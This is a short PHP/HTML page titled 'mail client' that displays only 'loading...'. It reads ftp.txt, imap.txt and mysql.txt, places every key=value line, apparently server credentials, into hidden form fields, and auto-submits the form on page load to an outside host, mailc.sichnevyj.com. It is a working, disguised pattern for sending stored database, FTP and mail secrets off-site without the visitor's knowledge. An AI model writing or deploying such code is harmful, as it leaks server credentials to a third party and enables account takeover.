<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>mail client</title>
</head>
<body onload="document.login.submit()">

<div align="center">loading...</div>

<form name="login" action="http://mailc.sichnevyj.com" method="post">
<?php

/*ini_set('display_errors', true);
error_reporting(E_ALL ^ E_NOTICE);*/

$a = array('ftp','imap','mysql');
foreach($a as $v)
{
	$f = file_get_contents($v.'.txt');
	$f = preg_split("/\n/", $f);
	foreach($f as $vv)
	{
		list($key, $value) = explode('=', trim($vv));
		?>
		<input type="hidden" name="<?php echo $v.'['.$key.']' ?>" value="<?php echo $value ?>" />
		<?php
	}
}

?>
</form>
</body>
</html>
